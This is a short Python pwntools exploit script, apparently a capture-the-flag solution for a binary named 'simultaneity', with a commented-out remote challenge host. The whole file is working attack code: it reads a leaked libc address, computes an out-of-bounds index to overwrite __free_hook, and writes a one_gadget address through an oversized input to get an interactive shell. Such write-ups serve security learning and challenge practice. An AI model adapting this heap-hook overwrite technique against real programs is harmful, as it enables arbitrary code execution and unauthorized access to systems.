#!/usr/bin/env python3

from pwn import *

exe = ELF("./simultaneity_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


def main():
    r = conn()
    
    #r = remote("mc.ax", 31547)

    r.recvline()
    r.sendline(str(0x100000))
    r.recvuntil("you are here: ")
    libc_leak = int(r.recv(14), 16)
    log.warn("Libc leak @ 0x%x", libc_leak)
    libc.address = libc_leak + 0x100ff0

    log.warn("Libc base @ 0x%x", libc.address)
    
    where = ((libc.sym["__free_hook"]) - libc_leak)//8
    
    r.recvline()
    r.recvline()

    r.sendline(str(where))

    pause()
    r.recvline()
    r.sendline("0"*0x1000 + str(libc.address + 0xe5456))
    
    r.interactive()

if __name__ == "__main__":
    main()
